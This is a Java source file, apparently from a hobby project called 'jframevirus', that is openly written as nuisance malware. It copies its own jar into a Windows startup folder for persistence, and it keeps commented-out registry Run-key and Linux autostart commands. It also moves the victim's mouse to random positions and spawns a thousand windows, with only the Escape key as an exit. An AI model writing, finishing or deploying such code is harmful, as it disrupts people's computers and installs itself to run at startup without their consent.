package com.joo.jframevirus;

import org.apache.commons.io.FileUtils;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.File;
import java.io.IOException;

public class MainController {
    private Dimension screenSize;
    private Robot robot;

    public MainController() {
        init();
        addVirusToStartup();
        startMouseMoving();
        startRandomFrame();
        setupWindowListener();
    }

    // TODO: test this in windows
    private void addVirusToStartup() {
        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            try {
                // TODO: 5/15/22 Test this in windows
                // Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Virus /t REG_SZ /d \"java -jar jframevirus.jar\"");
                File file = new File("jframevirus.jar");
                FileUtils.copyFile(file, new File("C:\\Windows\\Startup\\jframevirus.jar"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        } else { // TODO: 5/15/22 Make this work on linux and mac
            /*try {
                Runtime.getRuntime().exec("echo \"java -jar jframevirus.jar\" >> ~/.config/autostart/jframevirus.desktop");
            }*/
        }
    }

    private void init() {
        screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        try {
            robot = new Robot();
        } catch (AWTException e) {
            e.printStackTrace();
        }
    }

    // TODO: 5/15/22 Tst this in windows
    private void setupWindowListener() {
        KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
            if (e.getID() == KeyEvent.KEY_PRESSED) {
                if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
                    System.exit(0);
                }
            }
            return false;
        });
    }

    public void startMouseMoving() {
        new Thread(() -> {
            // TODO: 5/15/22 Make this a while loop
            for (byte i = 0; i < 10; i++) {
                robot.mouseMove((int) (Math.random() * screenSize.getWidth()),
                        (int) (Math.random() * screenSize.getHeight()));
            }
        }).start();
    }
    public void startRandomFrame(){
        new Thread(() -> {
            for (int i = 0; i < 1000; i++) {
                new RandomFrame(screenSize);
            }
        }).start();
    }
}
